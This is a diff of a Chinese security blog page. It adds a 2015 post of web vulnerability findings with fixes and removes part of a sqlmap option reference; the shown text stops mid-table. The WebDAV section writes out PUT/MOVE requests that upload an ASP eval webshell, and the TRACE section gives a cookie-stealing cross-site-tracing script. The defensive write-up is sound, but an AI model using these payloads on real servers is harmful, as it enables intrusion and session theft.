@@ -194,6 +194,266 @@
           
           
             
+              <a class="post-title-link" href="/2015/08/18/安全测评反馈记录/" itemprop="url">
+                安全测评反馈记录
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-08-18T10:11:06+08:00" content="2015-08-18">
+            2015-08-18
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/08/18/安全测评反馈记录/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/18/安全测评反馈记录/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="SQL注入">SQL注入</h2><p>等级：紧急</p>
+<p>描述：SQL注入利用现有应用程序，将恶意的SQL命令注入到后台数据库引擎执行，它可以通过在Web表单构造恶意SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句.<br>可以直接或间接的获取数据库内容，危害较大.</p>
+<p>建议：</p>
+<p>1.过滤客户端提交的敏感字符，提交的区域包括：<strong>地址栏中的所有参数，请求头信息，cookie中的参数</strong>，需要过滤的字符如下：<br><code>|</code>–<code>&amp;</code>–<code>;</code>–<code>$</code>–<code>%</code>–<code>@</code>–<code>&#39;</code>;<br><code>&quot;</code>–<code>&lt;</code>–<code>&gt;</code>–<code>(</code>;<code>)</code>–<code>+</code>–<code>CR</code>;<br><code>LF</code>–<code>,</code>–<code>.</code>–<code>select</code>–<code>from</code>;<br><code>update</code>–<code>delete</code>–<code>union</code>–<code>and</code>–<code>or</code>;<br>2.白名单策略：定制允许客户端输入的长度，类型.<br>3.做好数据库用户权限管理，只给用户开放必要权限.</p>
+<h2 id="XSS跨站脚本攻击">XSS跨站脚本攻击</h2><p>1.反射型xss<br>等级：低</p>
+<p>描述：恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的.<br>反射型XSS通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数被HTML解析、执行.<br>它的特点是非持久化，必须用户点击带有特定参数的链接才能引起.</p>
+<p>2.存储型XSS<br>等级：中</p>
+<p>描述：恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的.<br>存储型XSS通过上传非法代码，当用户触发恶意代码，浏览器就执行攻击者定义的脚本程序.</p>
+<p>建议：<br>  1.对用户输入进行数据合法性验证:</p>
+<table>
+<thead>
+<tr>
+<th>不可信数据将被放置的地方</th>
+<th>例子</th>
+<th>应该采取的编码</th>
+<th>编码格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTML标签之间</td>
+<td><code>&lt;div&gt; 不可信数据 &lt;/div&gt;</code></td>
+<td>HTML Entity编码</td>
+<td><code>&amp;–&gt;&amp;amp;&lt;–&gt;&amp;lt;&gt;–&gt;&amp;gt;”–&gt;&amp;quot;‘–&gt;&amp;#x27;/–&gt;&amp;#x2f;</code></td>
+</tr>
+<tr>
+<td>HTML标签的属性里</td>
+<td><code>&lt;input type=”text”value=” 不可信数据 ” /&gt;</code></td>
+<td>HTML Attribute编码</td>
+<td><code>&amp;#xHH;</code></td>
+</tr>
+<tr>
+<td>JavaScript标签里</td>
+<td><code>&lt;script&gt; var msg = ” 不可信数据 ” &lt;/script&gt;</code></td>
+<td>JavaScript编码</td>
+<td><code>\xHH</code></td>
+</tr>
+<tr>
+<td>HTML页面的URL里</td>
+<td><code>&lt;a href=”/page?p= 不可信数据 ” &gt;…&lt;/a&gt;</code></td>
+<td>URL编码</td>
+<td><code>%HH</code></td>
+</tr>
+<tr>
+<td>CSS里</td>
+<td><code>div style=” width: 不可信数据 ” &gt; … &lt;/div&gt;</code></td>
+<td>CSS编码</td>
+<td><code>\HH</code></td>
+</tr>
+</tbody>
+</table>
+<p>  2.为Cookie加上HttpOnly标记:<br>  许多XSS攻击的目标就是窃取用户Cookie.<br>窃取Cookie一般都会依赖JavaScript读取 Cookie信息，而HttpOnly标记的cookie不允许被JS操作，这样即使Web应用产生了XSS漏洞，Cookie信息也能得到较好的保护.</p>
+<h2 id="CSRF跨站请求伪造">CSRF跨站请求伪造</h2><p>等级：中</p>
+<p>描述：攻击者盗用用户身份，以用户名义发送恶意请求.<br>CSRF可能造成的危害包括：以用户名义发送邮件，发消息，盗取账号，甚至于购买商品，虚拟货币转账，个人隐私泄露以及财产安全.</p>
+<p>建议：<br>1.验证HTTP Referer字段：<br>验证每一个请求的Referer值，如果来自本站，是合法的.<br>如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求.</p>
+<p>2.在HTTP请求中以参数的形式(或是通过XMLHttpRequest这个类加到请求头中)加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求.</p>
+<h2 id="clickjaking点击劫持">clickjaking点击劫持</h2><p>级别：低</p>
+<p>描述：点击劫持是一种视觉上的欺骗手段.<br>攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情 的情况下点击透明的iframe页面.<br>通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上.</p>
+<p>建议：在头信息中添加X-FRAME-OPTIONS字段，禁止网站使用ifame载入网页.<br>X-Frame-Options响应头.<br>赋值有如下三种：</p>
+<pre><code><span class="number">1</span>.DENY：不能被嵌入到任何iframe或者frame中.
+
+<span class="number">2</span><span class="class">.SAMEORIGIN</span>:页面只能被本站页面嵌入到iframe或者frame中.
+
+<span class="number">3</span><span class="class">.ALLOW-FROM</span> uri：只能被嵌入到指定域名的框架中.
+</code></pre><p>apache可配置http.conf如下：</p>
+<pre><code><span class="tag">&lt;IfModule headers_module&gt;</span>
+<span class="keyword"><span class="common">Header</span></span> always append X-Frame-Options <span class="string">"DENY"</span>
+<span class="tag">&lt;/IfModule&gt;</span>
+</code></pre><h2 id="页面敏感信息泄露">页面敏感信息泄露</h2><p>级别：视泄露信息而定</p>
+<p>描述：<br>各种不同方式的敏感信息泄露给攻击者提供了信息.</p>
+<p>1.直接访问敏感信息文件<br>2.敏感信息(电话号码，内网IP，邮箱)显示在了页面，源码，url地址中.</p>
+<p>3.返回页面暴漏敏感信息(服务器版本，服务器物理路径…).</p>
+<p>4….发现再补</p>
+<p>建议(一一对应):<br>1.限制对该文件的访问.</p>
+<p>2.确认页面中电话号码，IP用途，站点可根据网站自身情况是否去除号码.<br>3.如果是正常页面中包含路径信息，如果不需要该路径信息，删除该信息.</p>
+<p>  如果是错误信息中包含路径信息，需要屏蔽应用程序错误信息.</p>
+<h2 id="Apache_HTTP_Server_“httpolny”cookie_泄露">Apache HTTP Server “httpolny”cookie 泄露</h2><p>1.为了防止XSS，我们通常采用给cookie附上httponly属性，来禁止js获取cookie.</p>
+<p>2.原理：当Apache接收到了cookie长度超过4k，返回400，并且将所有的cookie信息返回，提示cookie过长.</p>
+<p>3.利用：为用户的cookie添加一些无用信息，总长超过4k，使Apache返回400，并用过js正则过滤掉无用部分，我们就绕过了httponly的设置.</p>
+<p>4.修复：受影响的版本为2.21及其之前的所有版本，做好备份，升级Apache.</p>
+<h2 id="IIS_WebDav_Options_方法未禁用">IIS WebDav Options 方法未禁用</h2><p>1.WebDav是基于HTTP1.1的扩展协议，集成在window xp和IIS中，定义了除了Get，Post等一些http协议基本方法之外的一些方法例如：Option,put,move等.</p>
+<p>2.原理：使用option方法查看服务器允许哪些方法的提交，可能造成安全隐患.</p>
+<p>3.利用：<br>-使用option探测服务器信息：</p>
+<pre><code>OPTIONS/HTTP/<span class="number">1.1</span>
+Host:www<span class="class">.xxxx</span><span class="class">.com</span>
+</code></pre><p>  返回：</p>
+<pre><code>  HTTP/<span class="number">1.1</span> <span class="number">200</span> OK
+  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
+  Server: Microsoft-IIS/<span class="number">6.0</span>
+  X-Powered-By:ASP.NET
+  MS-Author-Via:DAV
+  Content-Length:<span class="number">0</span>
+  Accept-Ranges:none
+  DASL:&lt;DAV:sql&gt;
+  DAV:<span class="number">1.2</span>
+Public:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
+Cacha-Control:<span class="keyword">private</span>
+</code></pre><p>-上传文本文件：</p>
+<pre><code>PUT<span class="regexp">/test.txt HTTP/</span><span class="number">1.1</span>
+<span class="string">Host:</span>www.xxxx.com
+Content-<span class="string">Length:</span><span class="number">26</span>
+&lt;%eval(request(<span class="string">"cmd"</span>))%&gt;
+</code></pre><p>  返回：</p>
+<pre><code>HTTP/1.1 200 OK
+  Date:Fri,01 Jan 2011 04:23:39 GMT
+  Server: Microsoft-IIS/6.0
+  X-Powered-By:ASP.NET
+location：<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>
+Allow:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
+//上传成功
+</code></pre><p>-通过MOVE改名(需要IIS勾选允许脚本资源访问复选框)：</p>
+<pre><code>MOVE/test<span class="class">.txt</span> HTTP/<span class="number">1.1</span>
+Host:wwww<span class="class">.xxxx</span><span class="class">.com</span>
+Destination:http:<span class="comment">//www.<span class="label">xxxx.com/webshell.asp</span></span>
+</code></pre><p>  返回：</p>
+<pre><code>HTTP/<span class="number">1.1</span> <span class="number">201</span> Created
+  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
+  Server: Microsoft-IIS/<span class="number">6.0</span>
+  X-Powered-By:ASP.NET
+location：www.xxxx.com/webshell.asp
+Content-type:text/xml
+Content-length:<span class="number">0</span>
+<span class="comment">//修改成功</span>
+</code></pre><p>4修复：属于服务器配置不当造成的安全问题，options PUT DELETE MOVE方法如非必须请关闭.</p>
+<h2 id="TRACE_方法未禁用">TRACE 方法未禁用</h2><p>1.TRACE是HTTP协议提供的协议调试方法，发送什么请求，它会将请求原封返回.<br>可能存在的危害是能够与XSS配合获取用户httponly的cookie内容.</p>
+<p>2.原理：客户端JavaScript提出一个TRACE请求，并读取这个请求的响应，那么这段脚本就能够访问标记为HttpOnly的cookie，即使通过document.cookie属性也无法访问它们.</p>
+<p>3.利用：</p>
+<pre><code><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="actionscript">  
+&lt;!--  
+<span class="function"><span class="keyword">function</span> <span class="title">xssTRACE</span><span class="params">()</span></span>{  
+<span class="keyword">var</span> xmlHttp=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);  
+xmlHttp.open(<span class="string">"TRACE"</span>,<span class="string">"http://wmjie.51.net/swords/"</span>,<span class="literal">false</span>);  
+xmlHttp.send();  
+xmlDoc=xmlHttp.responseText;  
+alert(xmlDoc);  
+}  
+<span class="comment">//--&gt;  </span>
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
+<span class="tag">&lt;<span class="title">INPUT</span> <span class="attribute">TYPE</span>=<span class="value">BUTTON</span> <span class="attribute">onClick</span>=<span class="value">"xssTRACE();"</span> <span class="attribute">VALUE</span>=<span class="value">’XSS</span> <span class="attribute">TRACE</span>’&gt;</span>
+//将如上恶意代码插入页面，一个正常用户通过这个被劫持的页面进行访问，即使是设置属性httponly的cookie也通过TRACE方法的请求，显示在返回页面中.
+</code></pre><p>4.修复：属于服务器配置不当造成的安全问题，TRACE方法，如非必须请关闭.</p>
+<h2 id="IIS短文件名泄露">IIS短文件名泄露</h2><p>1.如果网站是运行在IIS服务器上，可以通过”~”来发现一些文件和文件夹,攻击者可以发现重要的文件或者文件夹，如果这些文件或者文件夹是正规的可见文件.攻击者可以通过该途径搜集文件名称(字符长度不超过6).<br>2.原理：使用通配符<code>*</code>和<code>?</code>发送一个请求到iis,当IIS接收到一个文件路径中包含”~”的请求时，它的反应是不同的.基于这个特点，我们可以根据http的响应区分一个可用或者不可用的文件.<br>3.修复：</p>
+<ul>
+<li><p>过滤<code>~</code>字符.</p>
+</li>
+<li><p>Windows中禁用8.3格式文件名方法如下(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)：</p>
+<p>  cmd&gt; fsutil 8dot3name query c:<br>“c:”表示查询C盘的状态.<br>如果功能被启用，会显示类似如下的信息：</p>
+<p>  Disable8dot3 的卷状态为 0 (8dot3 名称创建已启用).<br>  NtfsDisable8dot3NameCreation 的注册表状态为默认值 2 (卷级别设置).<br>  基于以上的两个设置，在 c: 上启用 8dot3 名称创建.</p>
+</li>
+</ul>
+<p>如果在C盘上关闭这个功能，则可使用以下命令：</p>
+<pre><code>cmd&gt; fsutil <span class="number">8</span>dot3name <span class="built_in">set</span> C: <span class="number">1</span>
+<span class="comment">//0（全部启动），1（全部禁用），2（每个盘符单独设置），3（除系统盘外全部禁用）.</span>
+</code></pre><p>也可以通过修改注册表实现：</p>
+<pre><code>键：HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\FileSystem</span>
+值：NTFSDisable8dot3NameCreation  类型：REG_DWORD
+</code></pre><ul>
+<li>使用waf进行防护.</li>
+</ul>
+<h2 id="会话标识别未更新">会话标识别未更新</h2><p>1.会话标识别未更新</p>
+<p>2.原理：用户的登录页面会有一个session id，登录成功后，应该使用新的session id 而不是保持登录页面的session id， 这样即使别人在网络上截获了你的登录页面的session id，仍然无法伪造客户身份进入系统.<br>如果使用同样的session id，则可能被截获并且伪造客户身份进入系统.</p>
+<p>3.修复：<br>-始终生成新的会话，供用户成功认证时登录.<br>-防止用户操纵会话标识.<br>-请勿接受用户浏览器登录时所提供的会话标识.</p>
+<h2 id="敏感信息泄露">敏感信息泄露</h2><p>1.以电话号码泄露为例</p>
+<p>2.原理：敏感信息(电话号码，内网IP)显示在了页面，源码，url地址中.</p>
+<p>3.利用：可作为进一步渗透的信息储备</p>
+<p>4.修复：此号码网站业务正常，无实际安全影响，站点可根据网站自身情况是否去除号码.</p>
+<h2 id="缺少httponly属性">缺少httponly属性</h2><p>1.会话cookie中缺少HttpOnly属性会导致攻击者可以通过程序(JS脚本、Applet等)获取到用户的cookie信息，造成用户cookie信息泄露，增加攻击者的跨站脚本攻击威胁.</p>
+<p>2.修复：<br>向所有会话cookie中添加“HttpOnly”属性.</p>
+<pre><code>Java示例：
+HttpServletResponse response2 = (HttpServletResponse)<span class="built_in">response</span>;
+response2.setHeader( <span class="string">"Set-Cookie"</span>, <span class="string">"name=value; HttpOnly"</span>); 
+
+C#示例：
+HttpCookie myCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>); 
+myCookie.HttpOnly = <span class="literal">true</span>; 
+<span class="built_in">Response</span>.AppendCookie(myCookie);
+
+VB.NET示例：
+<span class="keyword">Dim</span> myCookie As HttpCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>) 
+myCookie.HttpOnly = <span class="literal">True</span> 
+<span class="built_in">Response</span>.AppendCookie(myCookie) 
+</code></pre><h2 id="启用不安全的HTTP方法">启用不安全的HTTP方法</h2><p>1.检测到目标Web服务器配置成允许下列其中一个（或多个）HTTP 方法：DELETE, SEARCH,COPY,MOVE, PROPFIND, PROPPATCH, MKCOL ,LOCK ,UNLOCK.这些方法表示可能在服务器上使用了 WebDAV.由于dav方法允许客户端操纵服务器上的文件，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件.<br>2.利用：<br>参考：</p>
+<blockquote>
+<p>IIS WebDav Options 方法未禁用</p>
+</blockquote>
+<p>3.修复：<br>如果服务器不需要支持WebDAV，请禁用.<br>或者为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码.</p>
+<h2 id="目标web应用表单密码类型输入启用了自动完成操作">目标web应用表单密码类型输入启用了自动完成操作</h2><p>1.在web应用form表单中，如果input标签没有指定“autocomplete”属性为“off”，则“autocomplete”的属性会自动默认为“on”.<br>当web应用form表单中的密码类型的input标签的“autocomplete”属性为“on”时，用户若提交了一个新的用户名和密码时，浏览器将会询问用户是否保存该用户名和密码信息.<br>如果用户选择保存，则之后在显示该web应用表单时，用户名和密码将会被自动填充到对应的输入框中.<br>用户一但保存密码，攻击者就可以通过本地从浏览器缓存中获取明文密码，导致用户敏感信息泄露.</p>
+<p>2.修复：<br>修改web应用form表单中密码类型input标签的“autocomplete”属性为“off”.</p>
+<p>示例：</p>
+<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;
+则增加“autocomplete”属性为“off”即可，修改为：
+&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span> autocomplete=<span class="string">"off"</span>&gt;
+</code></pre></span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/08/17/SQL注入练级攻略-7-绕过姿势-二/" itemprop="url">
                 SQL注入练级攻略-7-绕过姿势(二)
               </a>
@@ -1255,709 +1515,6 @@ mysql&gt;delete <span class="keyword">from</span> mysql.<span class="keyword">us
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/10/SqlMap命令-全/" itemprop="url">
-                SqlMap命令-全
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-10T11:29:18+08:00" content="2015-08-10">
-            2015-08-10
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/10/SqlMap命令-全/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/10/SqlMap命令-全/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="Options（选项）">Options（选项）</h2><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>--version</code></td>
-<td>显示程序的版本号并退出</td>
-</tr>
-<tr>
-<td><code>-h, --help</code></td>
-<td>显示此帮助消息并退出</td>
-</tr>
-<tr>
-<td><code>-v VERBOSE</code></td>
-<td>详细级别：0-6（默认为1）</td>
-</tr>
-</tbody>
-</table>
-<h2 id="Target（目标）">Target（目标）</h2><pre><code>以下至少需要设置其中一个选项，设置目标<span class="built_in">URL</span>。 
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>-d DIRECT</code></td>
-<td>直接连接到数据库。</td>
-</tr>
-<tr>
-<td><code>-u URL, --url=URL</code></td>
-<td>目标URL。</td>
-</tr>
-<tr>
-<td><code>-l LIST</code></td>
-<td>从Burp或WebScarab代理的日志中解析目标。</td>
-</tr>
-<tr>
-<td><code>-r REQUESTFILE</code></td>
-<td>从一个文件中载入HTTP请求。</td>
-</tr>
-<tr>
-<td><code>-g GOOGLEDORK</code></td>
-<td>处理Google dork的结果作为目标URL。</td>
-</tr>
-<tr>
-<td><code>-c CONFIGFILE</code></td>
-<td>从INI配置文件中加载选项。</td>
-</tr>
-</tbody>
-</table>
-<h2 id="Request（请求）">Request（请求）</h2><pre><code>这些选项可以用来指定如何连接到目标<span class="built_in">URL</span>。 
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>--data=DATA</code></td>
-<td>通过POST发送的数据字符串</td>
-</tr>
-<tr>
-<td><code>--cookie=COOKIE</code></td>
-<td>HTTP Cookie头</td>
-</tr>
-<tr>
-<td><code>--cookie-urlencode</code></td>
-<td>URL 编码生成的cookie注入</td>
-</tr>
-<tr>
-<td><code>--drop-set-cookie</code></td>
-<td>忽略响应的Set - Cookie头信息</td>
-</tr>
-<tr>
-<td><code>--user-agent=AGENT</code></td>
-<td>指定  HTTP User - Agent头</td>
-</tr>
-<tr>
-<td><code>--random-agent</code></td>
-<td>使用随机选定的HTTP User - Agent头</td>
-</tr>
-<tr>
-<td><code>--referer=REFERER</code></td>
-<td>指定  HTTP Referer头</td>
-</tr>
-<tr>
-<td><code>--headers=HEADERS</code></td>
-<td>换行分开，加入其他的HTTP头</td>
-</tr>
-<tr>
-<td><code>--auth-type=ATYPE</code></td>
-<td>HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</td>
-</tr>
-<tr>
-<td><code>--auth-cred=ACRED</code></td>
-<td>HTTP身份验证凭据（用户名:密码） </td>
-</tr>
-<tr>
-<td><code>--auth-cert=ACERT</code></td>
-<td>HTTP认证证书（key_file，cert_file）</td>
-</tr>
-<tr>
-<td><code>--proxy=PROXY</code></td>
-<td>使用HTTP代理连接到目标URL  <code>--proxy http://127.0.0.1:8888</code></td>
-</tr>
-<tr>
-<td><code>--proxy-cred=PCRED</code></td>
-<td>HTTP代理身份验证凭据（用户名：密码）</td>
-</tr>
-<tr>
-<td><code>--ignore-proxy</code></td>
-<td>忽略系统默认的HTTP代理</td>
-</tr>
-<tr>
-<td><code>--delay=DELAY</code></td>
-<td>在每个HTTP请求之间的延迟时间，单位为秒  <code>--delay 0.5</code></td>
-</tr>
-<tr>
-<td><code>--timeout=TIMEOUT</code></td>
-<td>等待连接超时的时间（默认为30秒）</td>
-</tr>
-<tr>
-<td><code>--retries=RETRIES</code></td>
-<td>连接超时后重新连接的时间（默认3）</td>
-</tr>
-<tr>
-<td><code>--scope=SCOPE</code></td>
-<td>从所提供的代理日志中过滤器目标的正则表达式</td>
-</tr>
-<tr>
-<td><code>--safe-url=SAFURL</code></td>
-<td>在测试过程中经常访问的url地址</td>
-</tr>
-<tr>
-<td><code>--safe-freq=SAFREQ</code></td>
-<td>两次访问之间测试请求，给出安全的URL</td>
-</tr>
-</tbody>
-</table>
-<h2 id="Optimization（优化）">Optimization（优化）</h2><pre><code>这些选项可用于优化SqlMap的性能。
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>-o</code></td>
-<td>开启所有优化开关</td>
-</tr>
-<tr>
-<td><code>--predict-output</code></td>
-<td>预测常见的查询输出</td>
-</tr>
-<tr>
-<td><code>--keep-alive</code></td>
-<td>使用持久的HTTP（S）连接</td>
-</tr>
-<tr>
-<td><code>--null-connection</code></td>
-<td>从没有实际的HTTP响应体中检索页面长度</td>
-</tr>
-<tr>
-<td><code>--threads=THREADS</code></td>
-<td>最大的HTTP（S）请求并发量（默认为1）</td>
-</tr>
-</tbody>
-</table>
-<h2 id="Injection（注入）">Injection（注入）</h2><pre><code>这些选项可以用来指定测试哪些参数，  提供自定义的注入payloads和可选篡改脚本。 
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>-p TESTPARAMETER</code></td>
-<td>可测试的参数（S）</td>
-</tr>
-<tr>
-<td><code>--dbms=DBMS</code></td>
-<td>强制后端的DBMS为此值 如：–dbms “Mysql”</td>
-</tr>
-<tr>
-<td><code>--os=OS</code></td>
-<td>强制后端的DBMS操作系统为这个值</td>
-</tr>
-<tr>
-<td><code>--prefix=PREFIX</code></td>
-<td>注入payload字符串前缀</td>
-</tr>
-<tr>
-<td><code>--suffix=SUFFIX</code></td>
-<td>注入payload字符串后缀</td>
-</tr>
-<tr>
-<td><code>--tamper=TAMPER</code></td>
-<td>使用给定的脚本（S）篡改注入数据</td>
-</tr>
-</tbody>
-</table>
-<h2 id="Detection（检测）">Detection（检测）</h2><pre><code>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>--level=LEVEL</code></td>
-<td>执行测试的等级（1-5，默认为1）</td>
-</tr>
-<tr>
-<td><code>--risk=RISK</code></td>
-<td>执行测试的风险（0-3，默认为1）</td>
-</tr>
-<tr>
-<td><code>--string=STRING</code></td>
-<td>查询时有效时在页面匹配字符串</td>
-</tr>
-<tr>
-<td><code>--regexp=REGEXP</code></td>
-<td>查询时有效时在页面匹配正则表达式</td>
-</tr>
-<tr>
-<td><code>--text-only</code></td>
-<td>仅基于在文本内容比较网页</td>
-</tr>
-</tbody>
-</table>
-<p>  Techniques（技巧）： </p>
-<pre><code>这些选项可用于调整具体的SQL注入测试。 
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>--technique=TECH</code></td>
-<td>SQL注入技术测试（默认BEUST）</td>
-</tr>
-<tr>
-<td><code>--time-sec=TIMESEC</code></td>
-<td>DBMS响应的延迟时间（默认为5秒）</td>
-</tr>
-<tr>
-<td><code>--union-cols=UCOLS</code></td>
-<td>定列范围用于测试UNION查询注入</td>
-</tr>
-<tr>
-<td><code>--union-char=UCHAR</code></td>
-<td>用于暴力猜解列数的字符</td>
-</tr>
-</tbody>
-</table>
-<h2 id="Fingerprint（指纹）">Fingerprint（指纹）</h2><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>-f, --fingerprint</code></td>
-<td>执行检查广泛的DBMS版本指纹</td>
-</tr>
-</tbody>
-</table>
-<h2 id="Enumeration（枚举）">Enumeration（枚举）</h2><pre><code>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>-b, --banner</code></td>
-<td>检索数据库管理系统的标识</td>
-</tr>
-<tr>
-<td><code>--current-user</code></td>
-<td>检索数据库管理系统当前用户</td>
-</tr>
-<tr>
-<td><code>--current-db</code></td>
-<td>检索数据库管理系统当前数据库</td>
-</tr>
-<tr>
-<td><code>--is-dba</code></td>
-<td>检测DBMS当前用户是否DBA</td>
-</tr>
-<tr>
-<td><code>--users</code></td>
-<td>枚举数据库管理系统用户 </td>
-</tr>
-<tr>
-<td><code>--passwords</code></td>
-<td>枚举数据库管理系统用户密码哈希 </td>
-</tr>
-<tr>
-<td><code>--privileges</code></td>
-<td>枚举数据库管理系统用户的权限 </td>
-</tr>
-<tr>
-<td><code>--roles</code></td>
-<td>枚举数据库管理系统用户的角色 </td>
-</tr>
-<tr>
-<td><code>--dbs</code></td>
-<td>枚举数据库管理系统数据库 </td>
-</tr>
-<tr>
-<td><code>--tables</code></td>
-<td>枚举的DBMS数据库中的表 </td>
-</tr>
-<tr>
-<td><code>--columns</code></td>
-<td>枚举DBMS数据库表列 </td>
-</tr>
-<tr>
-<td><code>--dump</code></td>
-<td>转储数据库管理系统的数据库中的表项 </td>
-</tr>
-<tr>
-<td><code>--dump-all</code></td>
-<td>转储所有的DBMS数据库表中的条目 </td>
-</tr>
-<tr>
-<td><code>--search</code></td>
-<td>搜索列（S），表（S）和/或数据库名称（S） </td>
-</tr>
-<tr>
-<td><code>-D DB</code></td>
-<td>要进行枚举的数据库名 </td>
-</tr>
-<tr>
-<td><code>-T TBL</code></td>
-<td>要进行枚举的数据库表 </td>
-</tr>
-<tr>
-<td><code>-C COL</code></td>
-<td>要进行枚举的数据库列 </td>
-</tr>
-<tr>
-<td><code>-U USER</code></td>
-<td>用来进行枚举的数据库用户 </td>
-</tr>
-<tr>
-<td><code>--exclude-sysdbs</code></td>
-<td>枚举表时排除系统数据库 </td>
-</tr>
-<tr>
-<td><code>--start=LIMITSTART</code></td>
-<td>第一个查询输出进入检索 </td>
-</tr>
-<tr>
-<td><code>--stop=LIMITSTOP</code></td>
-<td>最后查询的输出进入检索 </td>
-</tr>
-<tr>
-<td><code>--first=FIRSTCHAR</code></td>
-<td>第一个查询输出字的字符检索 </td>
-</tr>
-<tr>
-<td><code>--last=LASTCHAR</code></td>
-<td>最后查询的输出字字符检索 </td>
-</tr>
-<tr>
-<td><code>--sql-query=QUERY</code></td>
-<td>要执行的SQL语句 </td>
-</tr>
-<tr>
-<td><code>--sql-shell</code></td>
-<td>提示交互式SQL的shell </td>
-</tr>
-</tbody>
-</table>
-<h2 id="Brute_force（蛮力）">Brute force（蛮力）</h2><pre><code>这些选项可以被用来运行蛮力检查。 
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>--common-tables</code></td>
-<td>检查存在共同表</td>
-</tr>
-<tr>
-<td><code>--common-columns</code></td>
